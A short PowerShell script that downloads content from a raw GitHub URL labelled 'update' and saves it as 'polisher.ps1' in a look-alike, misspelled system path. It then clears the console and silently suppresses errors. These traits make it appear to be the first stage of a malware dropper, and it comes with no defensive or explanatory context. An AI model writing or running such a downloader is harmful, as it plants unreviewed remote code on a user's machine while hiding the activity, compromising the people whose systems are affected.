$url = "https://raw.githubusercontent.com/wajih8/wpla_wajih/refs/heads/main/public/update"
$outputPath = "C:\ProgramX64\extentions\polisher.ps1"

try {
    
    $content = Invoke-RestMethod -Uri $url
    
    # Set-Content is often faster for plain text strings
    $content | Set-Content -Path $outputPath
    cls
    
    
} catch {
    cls
}
